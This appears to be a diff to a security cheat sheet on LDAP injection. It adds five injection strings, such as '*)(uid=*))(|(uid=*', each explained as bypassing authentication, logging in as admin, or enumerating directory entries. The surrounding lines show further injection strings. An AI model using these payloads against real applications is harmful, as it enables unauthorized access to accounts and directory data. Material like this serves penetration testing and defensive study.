@@ -96,6 +96,24 @@ admin*)((|userpassword=*)
 admin*)((|userPassword=*)
 x' or name()='username' or 'x'='y
 
+
+Here are some example payloads that an attacker might use to exploit an LDAP injection vulnerability:
+
+*)(uid=*))(|(uid=* - This payload includes wildcard characters that match any value for the uid attribute, 
+effectively bypassing any authentication check based on the username.
+
+*)(uid=admin - This payload searches for an LDAP entry with the uid attribute set to admin, allowing the attacker to log in as an administrator.
+
+*)(userPassword=*) - This payload matches any entry that has a non-empty userPassword attribute, 
+allowing the attacker to log in as any user without knowing their password.
+
+*)(objectClass=*) - This payload matches any entry that has an objectClass attribute, allowing the attacker to view a list of all entries in the LDAP directory.
+
+*))(&(uid=* - This payload injects an additional LDAP filter that matches any entry with a non-empty uid attribute, allowing the attacker to enumerate user accounts.
+
+These payloads are just a few examples of how an attacker could use LDAP injection to exploit a vulnerability in an application. 
+It's important to note that there are many other possible payloads, and the specific payload used will depend on the application and the attacker's goals.
+
 *****************************************************************************************
 
 References:
